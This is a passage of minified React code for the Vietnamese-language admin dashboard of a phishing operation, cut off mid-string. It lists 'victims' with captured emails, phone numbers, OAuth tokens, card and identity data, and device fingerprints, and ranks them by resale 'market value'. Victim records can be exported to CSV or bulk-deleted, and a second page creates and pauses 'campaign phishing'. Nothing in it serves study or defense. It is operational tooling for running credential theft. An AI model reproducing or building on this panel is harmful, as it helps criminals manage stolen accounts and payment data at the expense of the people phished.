Object.entries({...r,search:s}).forEach(([E,N])=>{N&&T.append(E,N.toString())}),Q.apiRequest(`/admin/victims?${T.toString()}`).then(E=>{const N=(E.items||[]).map(A=>{var w;return{id:A.id,email:A.email,name:A.name,phone:A.phone,capture_timestamp:A.captureTimestamp,campaign_id:(w=A.campaign)==null?void 0:w.id,campaign:A.campaign,capture_method:A.captureMethod,capture_source:A.captureSource,session_data:A.sessionData||{},device_fingerprint:A.deviceFingerprint||{},validation:A.validation||{},risk_assessment:A.riskAssessment||{},card_information:A.cardInformation||{},identity_verification:A.identityVerification||{},created_at:A.createdAt,updated_at:A.updatedAt,is_active:A.isActive,hasOAuthTokens:A.hasOAuthTokens,oauthTokensCount:A.oauthTokensCount,hasCardInfo:A.hasCardInfo,hasIdentityVerification:A.hasIdentityVerification,registrationCompleted:A.registrationCompleted}});return{...E,items:N}})}}),{data:h}=me({queryKey:["oauth-tokens",c==null?void 0:c.id],queryFn:()=>c?Q.apiRequest(`/admin/victims/${c.id}/oauth-tokens`):[],enabled:!!c}),m=pe({mutationFn:T=>Q.apiRequest("/admin/victims/bulk-delete",{method:"POST",body:JSON.stringify({victim_ids:T})}),onSuccess:()=>{t.invalidateQueries({queryKey:["victims"]}),t.invalidateQueries({queryKey:["dashboard-stats"]}),y(new Set),b(!1),n({title:"Thành công",description:"Đã xóa các victim đã chọn"})},onError:T=>{n({title:"Lỗi",description:T.message,variant:"destructive"})}}),B=pe({mutationFn:()=>Q.apiRequest("/admin/victims/export"),onSuccess:T=>{const E=new Blob([T],{type:"text/csv"}),N=URL.createObjectURL(E),A=document.createElement("a");A.href=N,A.download=`victims_${new Date().toISOString().split("T")[0]}.csv`,document.body.appendChild(A),A.click(),document.body.removeChild(A),URL.revokeObjectURL(N),n({title:"Thành công",description:"Dữ liệu đã được xuất thành công"})},onError:T=>{n({title:"Lỗi",description:T.message,variant:"destructive"})}}),P=mt(T=>{i({...r,page:1})},500),S=T=>{a(T),P(T)},O=(T,E)=>{const N=new Set(l);E?N.add(T):N.delete(T),y(N),b(N.size>0)},V=T=>{if(T){const E=new Set((o==null?void 0:o.items.map(N=>N.id))||[]);y(E),b(!0)}else y(new Set),b(!1)},v=()=>{l.size!==0&&confirm(`Bạn có chắc chắn muốn xóa ${l.size} victim đã chọn?`)&&m.mutate(Array.from(l))},I=(o==null?void 0:o.total)||0,u=(o==null?void 0:o.items.filter(T=>{var E,N;return((E=T.validation)==null?void 0:E.market_value)==="high"||((N=T.validation)==null?void 0:N.market_value)==="premium"}).length)||0,D=(o==null?void 0:o.items.filter(T=>T.capture_method.startsWith("oauth")).length)||0,z=(o==null?void 0:o.items.filter(T=>T.is_active).length)||0,G=T=>{switch(T){case"premium":return"bg-purple-100 text-purple-800";case"high":return"bg-red-100 text-red-800";case"medium":return"bg-yellow-100 text-yellow-800";case"low":return"bg-gray-100 text-gray-800";default:return"bg-gray-100 text-gray-800"}},j=T=>{switch(T){case"premium":return"Premium";case"high":return"Cao";case"medium":return"Trung bình";case"low":return"Thấp";default:return"Chưa xác định"}},W=T=>{switch(T){case"high":return"bg-red-100 text-red-800";case"medium":return"bg-yellow-100 text-yellow-800";case"low":return"bg-green-100 text-green-800";default:return"bg-gray-100 text-gray-800"}};return e.jsxs("div",{className:"p-6 max-w-7xl mx-auto",children:[e.jsx("div",{className:"mb-8",children:e.jsxs("div",{className:"flex justify-between items-start",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900",children:"Quản lý Victims"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Quản lý và theo dõi các victim đã được capture"})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsxs(C,{onClick:()=>g(),variant:"outline",size:"sm",children:[e.jsx(ye,{className:"h-4 w-4 mr-2"}),"Làm mới"]}),e.jsxs(C,{onClick:()=>B.mutate(),disabled:B.isPending,variant:"outline",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),B.isPending?"Đang xuất...":"Xuất CSV"]})]})]})}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6 mb-8",children:[e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Tổng Victims"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:I})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsx(Ve,{className:"h-6 w-6 text-blue-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"High Value"}),e.jsx("p",{className:"text-2xl font-bold text-purple-600",children:u})]}),e.jsx("div",{className:"p-3 bg-purple-50 rounded-lg",children:e.jsx(tn,{className:"h-6 w-6 text-purple-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"OAuth Captures"}),e.jsx("p",{className:"text-2xl font-bold text-green-600",children:D})]}),e.jsx("div",{className:"p-3 bg-green-50 rounded-lg",children:e.jsx(Je,{className:"h-6 w-6 text-green-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Active"}),e.jsx("p",{className:"text-2xl font-bold text-blue-600",children:z})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsx(wt,{className:"h-6 w-6 text-blue-600"})})]})})})]}),f&&e.jsx(k,{className:"mb-6 bg-blue-50 border-blue-200",children:e.jsx(_,{className:"p-4",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-4",children:[e.jsxs("span",{className:"text-sm font-medium text-gray-700",children:["Đã chọn ",l.size," victim"]}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>{y(new Set),b(!1)},children:"Bỏ chọn tất cả"})]}),e.jsx("div",{className:"flex gap-2",children:e.jsxs(C,{variant:"destructive",size:"sm",onClick:v,disabled:m.isPending,children:[e.jsx(dn,{className:"h-4 w-4 mr-2"}),"Xóa đã chọn (",l.size,")"]})})]})})}),e.jsx(k,{className:"mb-6",children:e.jsx(_,{className:"p-6",children:e.jsx("div",{className:"flex flex-col lg:flex-row gap-4 items-center justify-between",children:e.jsxs("div",{className:"flex flex-1 gap-4 w-full lg:w-auto",children:[e.jsxs("div",{className:"relative flex-1 lg:w-80",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm kiếm email, tên, số điện thoại...",value:s,onChange:T=>S(T.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:r.captureMethod||"",onValueChange:T=>i({...r,captureMethod:T||void 0,page:1}),children:[e.jsx(re,{className:"w-40",children:e.jsx(le,{placeholder:"Phương thức"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"",children:"Tất cả"}),e.jsx(R,{value:"oauth_google",children:"OAuth Google"}),e.jsx(R,{value:"oauth_apple",children:"OAuth Apple"}),e.jsx(R,{value:"form_direct",children:"Form Direct"})]})]}),e.jsxs(ce,{value:r.market_value||"",onValueChange:T=>i({...r,market_value:T||void 0,page:1}),children:[e.jsx(re,{className:"w-40",children:e.jsx(le,{placeholder:"Giá trị"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"",children:"Tất cả"}),e.jsx(R,{value:"premium",children:"Premium"}),e.jsx(R,{value:"high",children:"Cao"}),e.jsx(R,{value:"medium",children:"Trung bình"}),e.jsx(R,{value:"low",children:"Thấp"})]})]})]})})})}),e.jsx(k,{children:e.jsx(_,{className:"p-0",children:p?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Đang tải dữ liệu..."})]}):(o==null?void 0:o.items.length)===0?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx(Ve,{className:"h-12 w-12 mx-auto mb-4 text-gray-300"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Không có dữ liệu"})]}):e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{className:"w-12",children:e.jsx(Yt,{checked:l.size===(o==null?void 0:o.items.length)&&o.items.length>0,onCheckedChange:V})}),e.jsx(K,{children:"Email"}),e.jsx(K,{children:"Thông tin"}),e.jsx(K,{children:"Phương thức"}),e.jsx(K,{children:"Campaign"}),e.jsx(K,{children:"Giá trị"}),e.jsx(K,{children:"Device Fingerprint"}),e.jsx(K,{children:"Ngày capture"}),e.jsx(K,{className:"text-right",children:"Thao tác"})]})}),e.jsx(De,{children:o==null?void 0:o.items.map(T=>{var E,N,A;return e.jsxs(he,{className:"hover:bg-gray-50",children:[e.jsx(H,{children:e.jsx(Yt,{checked:l.has(T.id),onCheckedChange:w=>O(T.id,w)})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(Ke,{className:"h-4 w-4 text-gray-400"}),e.jsx("span",{className:"font-medium text-gray-900",children:T.email})]})}),e.jsx(H,{children:e.jsxs("div",{className:"space-y-1",children:[T.name&&e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(_e,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:T.name})]}),T.phone&&e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(St,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:T.phone})]})]})}),e.jsx(H,{children:e.jsx($,{variant:"outline",children:T.capture_method==="oauth_google"?"OAuth Google":T.capture_method==="oauth_apple"?"OAuth Apple":"Form Direct"})}),e.jsx(H,{children:T.campaign?e.jsx($,{variant:"outline",children:T.campaign.name}):e.jsx("span",{className:"text-sm text-gray-400",children:"-"})}),e.jsx(H,{children:e.jsx($,{className:G((E=T.validation)==null?void 0:E.market_value),children:j((N=T.validation)==null?void 0:N.market_value)})}),e.jsx(H,{children:(A=T.device_fingerprint)!=null&&A.fingerprint_id?e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(Ct,{className:"h-4 w-4 text-gray-400"}),e.jsxs("span",{className:"text-xs font-mono text-gray-600",children:[T.device_fingerprint.fingerprint_id.substring(0,12),"..."]})]}):e.jsx("span",{className:"text-sm text-gray-400",children:"-"})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(Te,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:ht(T.capture_timestamp)})]})}),e.jsx(H,{className:"text-right",children:e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>x(T),children:[e.jsx($e,{className:"h-4 w-4 mr-1"}),"Xem"]})})]},T.id)})})]})})}),o&&o.pages>1&&e.jsx("div",{className:"mt-6 flex justify-center",children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page-1}),disabled:r.page===1,children:"Trước"}),e.jsxs("span",{className:"text-sm text-gray-600 px-4",children:["Trang ",r.page," / ",o.pages," (Tổng: ",o.total," bản ghi)"]}),e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page+1}),disabled:r.page===o.pages,children:"Sau"})]})}),c&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsx("div",{className:"bg-white rounded-lg max-w-6xl w-full max-h-screen overflow-y-auto",children:e.jsxs("div",{className:"p-6",children:[e.jsxs("div",{className:"flex justify-between items-center mb-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-gray-900",children:"Chi tiết Victim"}),e.jsx(C,{variant:"outline",onClick:()=>x(null),children:"Đóng"})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(_e,{className:"h-5 w-5"}),"Thông tin cơ bản"]})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Email"}),e.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[e.jsx("p",{className:"text-sm font-semibold text-gray-900",children:c.email}),e.jsx(C,{variant:"ghost",size:"icon",className:"h-6 w-6",onClick:()=>{$t(c.email),n({title:"Đã sao chép",description:"Email đã được sao chép"})},children:e.jsx(Vt,{className:"h-3 w-3"})})]})]}),c.name&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Tên"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.name})]}),c.phone&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Số điện thoại"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.phone})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Phương thức capture"}),e.jsx($,{className:"mt-1",children:c.capture_method==="oauth_google"?"OAuth Google":c.capture_method==="oauth_apple"?"OAuth Apple":"Form Direct"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Ngày capture"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:ue(c.capture_timestamp)})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(We,{className:"h-5 w-5"}),"Campaign & Validation"]})}),e.jsxs(_,{className:"space-y-4",children:[c.campaign?e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Campaign"}),e.jsx("p",{className:"text-sm font-semibold text-gray-900 mt-1",children:c.campaign.name})]}):e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Campaign"}),e.jsx("p",{className:"text-sm text-gray-400 mt-1",children:"Không có"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Giá trị thị trường"}),e.jsx($,{className:G((U=c.validation)==null?void 0:U.market_value),children:j((J=c.validation)==null?void 0:J.market_value)})]}),c.risk_assessment&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Mức độ rủi ro"}),e.jsx($,{className:W(c.risk_assessment.risk_level),children:c.risk_assessment.risk_level||"Chưa đánh giá"})]}),((q=c.card_information)==null?void 0:q.has_cards)&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Thẻ tín dụng"}),e.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[e.jsx(dt,{className:"h-4 w-4 text-green-500"}),e.jsxs("span",{className:"text-sm text-gray-900",children:[c.card_information.cards_count||0," thẻ"]})]})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(Je,{className:"h-5 w-5"}),"OAuth Tokens"]})}),e.jsx(_,{className:"space-y-4",children:h&&h.length>0?h.map(T=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded-lg",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2",children:[e.jsx($,{variant:"outline",children:T.provider}),e.jsx($,{className:T.token_status==="active"?"bg-green-100 text-green-800":T.token_status==="expired"?"bg-red-100 text-red-800":"bg-gray-100 text-gray-800",children:T.token_status})]}),e.jsxs("div",{className:"text-xs text-gray-600 space-y-1",children:[e.jsxs("p",{children:["Issued: ",ue(T.issued_at)]}),e.jsxs("p",{children:["Expires: ",ue(T.expires_at)]}),T.refresh_count>0&&e.jsxs("p",{children:["Refreshed: ",T.refresh_count," times"]})]})]},T.id)):e.jsx("p",{className:"text-sm text-gray-400",children:"Không có OAuth tokens"})})]}),e.jsx("div",{className:"lg:col-span-3",children:e.jsx(fi,{fingerprint:c.device_fingerprint})}),e.jsxs(k,{className:"lg:col-span-3",children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(zt,{className:"h-5 w-5"}),"Session Data"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[c.session_data.ip_address&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"IP Address"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.session_data.ip_address})]}),c.session_data.user_agent&&e.jsxs("div",{className:"md:col-span-2",children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"User Agent"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1 break-all",children:c.session_data.user_agent})]}),c.session_data.utm_parameters&&e.jsxs("div",{className:"md:col-span-4",children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"UTM Parameters"}),e.jsxs("div",{className:"mt-2 flex flex-wrap gap-2",children:[c.session_data.utm_parameters.utm_source&&e.jsxs($,{variant:"outline",children:["Source: ",c.session_data.utm_parameters.utm_source]}),c.session_data.utm_parameters.utm_medium&&e.jsxs($,{variant:"outline",children:["Medium: ",c.session_data.utm_parameters.utm_medium]}),c.session_data.utm_parameters.utm_campaign&&e.jsxs($,{variant:"outline",children:["Campaign: ",c.session_data.utm_parameters.utm_campaign]})]})]})]})})]})]})]})})})]})}function ji(){const{toast:n}=Se(),t=qe(),[s,a]=d.useState(""),[r,i]=d.useState({page:1,per_page:20,status:""}),[c,x]=d.useState(null),[l,y]=d.useState(!1),[f,b]=d.useState(!1),[o,p]=d.useState({name:"",description:"",start_date:"",end_date:""}),{isConnected:g}=Ge({type:"campaigns",enabled:!0,onMessage:N=>{(N.type==="campaign:created"||N.type==="campaign:updated"||N.type==="campaign:status-changed")&&(t.invalidateQueries({queryKey:["campaigns"]}),n({title:"Campaign Updated",description:"Campaign data has been updated"}))}}),{data:h,isLoading:m,refetch:B}=me({queryKey:["campaigns",r,s],queryFn:()=>{const N=new URLSearchParams;return Object.entries({...r,search:s}).forEach(([A,w])=>{w&&N.append(A,w.toString())}),Q.apiRequest(`/admin/campaigns?${N.toString()}`).then(A=>{const w=A.data||[],X=A.total??w.length;return{items:w,total:X,pages:1,current_page:1,per_page:w.length}})}}),{data:P}=me({queryKey:["campaign-stats",c==null?void 0:c.id],queryFn:()=>c?Q.apiRequest(`/admin/campaigns/${c.id}/statistics`).then(N=>(N==null?void 0:N.data)??N):null,enabled:!!c}),S=pe({mutationFn:N=>Q.apiRequest("/admin/campaigns",{method:"POST",body:JSON.stringify(N)}),onSuccess:()=>{t.invalidateQueries({queryKey:["campaigns"]}),y(!1),p({name:"",description:"",start_date:"",end_date:""}),n({title:"Thành công",description:"Campaign đã được tạo thành công"})},onError:N=>{n({title:"Lỗi",description:N.message,variant:"destructive"})}}),O=pe({mutationFn:({id:N,data:A})=>Q.apiRequest(`/admin/campaigns/${N}`,{method:"PUT",body:JSON.stringify(A)}),onSuccess:()=>{t.invalidateQueries({queryKey:["campaigns"]}),b(!1),x(null),n({title:"Thành công",description:"Campaign đã được cập nhật"})},onError:N=>{n({title:"Lỗi",description:N.message,variant:"destructive"})}}),V=pe({mutationFn:N=>Q.apiRequest(`/admin/campaigns/${N}`,{method:"DELETE"}),onSuccess:()=>{t.invalidateQueries({queryKey:["campaigns"]}),n({title:"Thành công",description:"Campaign đã được xóa"})},onError:N=>{n({title:"Lỗi",description:N.message,variant:"destructive"})}}),v=pe({mutationFn:({id:N,status:A})=>Q.apiRequest(`/admin/campaigns/${N}/status`,{method:"PUT",body:JSON.stringify({status:A})}),onSuccess:()=>{t.invalidateQueries({queryKey:["campaigns"]}),n({title:"Thành công",description:"Trạng thái campaign đã được cập nhật"})},onError:N=>{n({title:"Lỗi",description:N.message,variant:"destructive"})}}),I=mt(N=>{i({...r,page:1})},500),u=N=>{a(N),I(N)},D=()=>{S.mutate(o)},z=()=>{c&&O.mutate({id:c.id,data:o})},G=N=>{confirm("Bạn có chắc chắn muốn xóa campaign này?")&&V.mutate(N)},j=(N,A)=>{const w=A==="active"?"paused":"active";v.mutate({id:N,status:w})},W=N=>{switch(N){case"active":return"bg-green-100 text-green-800";case"paused":return"bg-yellow-100 text-yellow-800";case"completed":return"bg-blue-100 text-blue-800";case"archived":return"bg-gray-100 text-gray-800";default:return"bg-gray-100 text-gray-800"}},U=N=>{switch(N){case"active":return"Đang hoạt động";case"paused":return"Tạm dừng";case"completed":return"Hoàn thành";case"archived":return"Đã lưu trữ";default:return N}},J=(h==null?void 0:h.total)||0,q=(h==null?void 0:h.items.filter(N=>N.status==="active").length)||0,T=(h==null?void 0:h.items.filter(N=>N.status==="paused").length)||0,E=(h==null?void 0:h.items.filter(N=>N.status==="completed").length)||0;return e.jsxs("div",{className:"p-6 max-w-7xl mx-auto",children:[e.jsx("div",{className:"mb-8",children:e.jsxs("div",{className:"flex justify-between items-start",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900",children:"Quản lý Campaign"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Tạo và quản lý các campaign phishing"})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:g?e.jsx("span",{className:"text-green-600",children:"● Real-time"}):e.jsx("span",{className:"text-gray-400",children:"○ Offline"})}),e.jsxs(C,{onClick:()=>B(),variant:"outline",size:"sm",children:[e.jsx(ye,{className:"h-4 w-4 mr-2"}),"Làm mới"]}),e.jsxs(C,{onClick:()=>{p({name:"",description:"",start_date:"",end_date:""}),y(!0)},children:[e.jsx(Ss,{className:"h-4 w-4 mr-2"}),"Tạo Campaign"]})]})]})}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6 mb-8",children:[e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Tổng Campaign"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:J})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsx(Nt,{className:"h-6 w-6 text-blue-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Đang hoạt động"}),e.jsx("p",{className:"text-2xl font-bold text-green-600",children:q})]}),e.jsx("div",{className:"p-3 bg-green-50 rounded-lg",children:e.jsx(lt,{className:"h-6 w-6 text-green-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Tạm dừng"}),e.jsx("p",{className:"text-2xl font-bold text-yellow-600",children:T})]}),e.jsx("div",{className:"p-3 bg-yellow-50 rounded-lg",children:e.jsx(_s,{className:"h-6 w-6 text-yellow-600"})})]})})}),e.jsx(k,{className:"hover:shadow-md transition-shadow",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Hoàn thành"}),e.jsx("p",{className:"text-2xl font-bold text-blue-600",children:E})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsx(We,{className:"h-6 w-6 text-blue-600"})})]})})})]}),e.jsx(k,{className:"mb-6",children:e.jsx(_,{className:"p-6",children:e.jsx("div",{className:"flex flex-col lg:flex-row gap-4 items-center justify-between",children:e.jsxs("div",{className:"flex flex-1 gap-4 w-full lg:w-auto",children:[e.jsxs("div",{className:"relative flex-1 lg:w-80",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm kiếm campaign...",value:s,onChange:N=>u(N.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:r.status||"",onValueChange:N=>i({...r,status:N||void 0,page:1}),children:[e.jsx(re,{className:"w-40",children:e.jsx(le,{placeholder:"Trạng thái"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"",children:"Tất cả"}),e.jsx(R,{value:"active",children:"Đang hoạt động"}),e.jsx(R,{value:"paused",children:"Tạm dừng"}),e.jsx(R,{value:"completed",children:"Hoàn thành"}),e.jsx(R,{value:"archived",children:"Đã lưu trữ"})]})]})]})})})}),e.jsx(k,{children:e.jsx(_,{className:"p-0",children:m?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Đang tải dữ liệu..."})]}):(h==null?void 0:h.items.length)===0?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx(Nt,{className:"h-12 w-12 mx-auto mb-4 text-gray-300"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Không có campaign nào"}),e.jsxs(C,{onClick:()=>y(!0),className:"mt-4",children:[e.jsx(Ss,{className:"h-4 w-4 mr-2"}),"Tạo campaign đầu tiên"]})]}):e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"Tên Campaign"}),e.jsx(K,{children:"Mô tả"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{children:"Ngày bắt đầu"}),e.jsx(K,{children:"Ngày kết thúc"}),e.jsx(K,{children:"Ngày tạo"}),e.jsx(K,{className:"text-right",children:"Thao tác"})]})}),e.jsx(De,{children:h==null?void 0:h.items.map(N=>e.jsxs(he,{className:"hover:bg-gray-50",children:[e.jsx(H,{children:e.jsx("div",{className:"font-medium text-gray-900",children:N.name})}),e.jsx(H,{children:e.jsx("div",{className:"text-sm text-gray-600 max-w-xs truncate",children:N.description||"-"})}),e.jsx(H,{children:e.jsx($,{className:W(N.status),children:U(N.status)})}),e.jsx(H,{children:N.start_date?e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(Te,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:ue(N.start_date)})]}):e.jsx("span",{className:"text-sm text-gray-400",children:"-"})}),e.jsx(H,{children:N.end_date?e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(Te,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:ue(N.end_date)})]}):e.jsx("span",{className:"text-sm text-gray-400",children:"-"})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(Te,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:ht(N.created_at)})]})}),e.jsx(H,{className:"text-right",children:e.jsxs("div",{className:"flex justify-end gap-2",children:[e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>{x(N),p({name:N.name,description:N.description||"",start_date:N.start_date||"",end_date:N.end_date||""}),b(!0)},children:[e.jsx($e,{className:"h-4 w-4 mr-1"}),"Xem"]}),N.status==="active"||N.status==="paused"?e.jsx(C,{variant:"outline",size:"sm",onClick:()=>j(N.id,N.status),disabled:v.isPending,children:N.status==="active"?e.jsxs(e.Fragment,{children:[e.jsx(_s,{className:"h-4 w-4 mr-1"}),"Tạm dừng"]}):e.jsxs(e.Fragment,{children:[e.jsx(lt,{className:"h-4 w-4 mr-1"}),"Kích hoạt"]})}):null,e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>G(N.id),disabled:V.isPending,children:[e.jsx(dn,{className:"h-4 w-4 mr-1"}),"Xóa"]})]})})]},N.id))})]})})}),h&&h.pages>1&&e.jsx("div",{className:"mt-6 flex justify-center",children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page-1}),disabled:r.page===1,children:"Trước"}),e.jsxs("span",{className:"text-sm text-gray-600 px-4",children:["Trang ",r.page," / ",h.pages," (Tổng: ",h.total," bản ghi)"]}),e.jsx(C,{variant:"outline",onClick:()=>i({...r,page:r.page+1}),disabled:r.page===h.pages,children:"Sau"})]})}),l&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-white rounded-lg max-w-2xl w-full p-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-gray-900 mb-6",children:"Tạo Campaign Mới"}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Tên Campaign *"}),e.jsx(se,{value:o.name,onChange:N=>p({...o,name:N.target.value}),placeholder:"Nhập tên campaign"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mô tả"}),e.jsx("textarea",{value:o.description,onChange:N=>p({...o,description:N.target.value}),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",rows:4,placeholder:"Nhập mô tả campaign"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ngày bắt 